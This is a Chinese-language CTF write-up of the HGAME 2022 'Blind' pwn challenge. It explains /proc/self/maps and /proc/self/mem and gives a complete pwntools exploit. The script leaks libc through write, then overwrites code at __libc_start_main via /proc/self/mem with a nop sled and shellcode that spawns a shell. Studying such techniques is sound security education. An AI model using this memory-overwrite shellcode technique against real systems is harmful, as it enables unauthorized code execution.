---
title: 「PWN」【HGAME 2022 Week2】 Pwn Writeup WP 复现
tags: ['CTF', 'Pwn', 'writeup', 'wp']
authors: [nova]

---

<!--truncate-->

# Blind

>  看题目简介应该是BROP的东西，也发现确实没有附件
>
>  完全没做过BROP的题，试试
>
>  [CTF-WIKI_BROP](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/medium-rop/#brop)

首先先查看一下程序会干什么

![image-20220217140202100](https://cdn.novanoir.moe/img/image-20220217140202100.png)

可以看到程序首先给出了`write`的地址，但是由于原创我们不知道libc的版本，虽然也可以根据低12位来找到libc版本，但是我们选择`LibcSearcher`会更快一些

这样的话`libc_base`是很容易找到的

```python
sh.recvuntil(b"write: ")
write_addr = int(sh.recvuntil(b"\n", drop=True), 16)
success(">>> write_addr: {}".format(hex(write_addr)))

libc = LibcSearcher('write', write_addr)
libc_base = write_addr - libc.dump('write')
success(">>> libc_base: {}".format(hex(libc_base)))
```

接着它让我们可以打开一个文件

![image-20220217140449422](https://cdn.novanoir.moe/img/image-20220217140449422.png)

介绍一下`/proc/`的一些相关内容

## /proc/

Linux系统内核提供了一种通过/proc文件系统，在程序运行时访问内核数据，改变内核设置的机制。/proc是一种伪文件结构，也就是说是仅存在于内存中，不存在于外存中的。/proc中一般比较重要的目录是sys，net和scsi，sys目录是可写的，可以通过它来访问和修改内核的参数。

/proc中还有一些以PID命名（进程号）的进程目录，可以读取对应进程的信息。另外还有一个/self目录，用于记录本进程的信息

### /proc/self/

这就相当于一个软链接，不同的PID访问这个目录进入的实质上是不同的/proc/$(PID)/

#### /proc/self/maps

这个文件用于记录当前进程的内存映射关系，类似于gdb下的vmmap指令，通过读取该文件可以获得内存代码段基地址

#### /proc/self/mem

该文件记录的是进程的内存信息，通过修改该文件相当于直接修改进程的内存。这个文件是可读可写的，但是如果直接读的话则会报错。

需要根据`/proc/self/maps`的映射信息来修改`offset`的`val`

如果我们将一段代码写到`.text`上，则该地址的代码就变成了`disasm(val)`



因此，我们很自然地想到把shellcode写上去，但由于没有源文件，我们也不能清楚究竟程序执行到了什么地方，也就没有办法控制程序准确跳转到`shellcode`开始的地方

## Shellcode Spray 

此时如果我们把地址上下文都改成nop，并在最后添加一段`shellcode`

这样，只要程序执行到了任意`nop`所在的位置，便都可以正常执行`shellcode`

因此，我们不妨修改`__libc_start_main`开始的一大段地址都为`nop`，这能保证程序一定被`nop`覆盖

exp:

```python
import string

from pwn import *
from pwnlib.util.iters import mbruteforce
from LibcSearcher import LibcSearcher

context.log_level = 'DEBUG'
context.arch = 'amd64'
context.os = 'linux'

sh = remote('chuj.top', 51812)

sh.recvuntil(b' == ')
hash_code = sh.recvuntil(b"\n", drop=True).decode('UTF-8')
charset = string.ascii_letters
# print(hash_code, type(hash_code))
proof = mbruteforce(lambda x: hashlib.sha256(x.encode()).hexdigest() ==
                              hash_code, charset, 4, method='fixed')

sh.sendlineafter(b"????> ", proof.encode())

sh.recvuntil(b"write: ")
write_addr = int(sh.recvuntil(b"\n", drop=True), 16)
success(">>> write_addr: {}".format(hex(write_addr)))

libc = LibcSearcher('write', write_addr)
libc_base = write_addr - libc.dump('write')
success(">>> libc_base: {}".format(hex(libc_base)))

sh.sendlineafter(b">> ", b'/proc/self/mem\x00')

__libc_start_main_addr = libc_base + libc.dump('__libc_start_main')
success(">>> __libc_start_main: {}".format(hex(__libc_start_main_addr)))
sh.sendlineafter(b">> ", str(__libc_start_main_addr).encode())

payload = asm('nop') * 0x300 + asm(shellcraft.sh())
sh.sendlineafter(b">> ", payload)

sh.interactive()
```



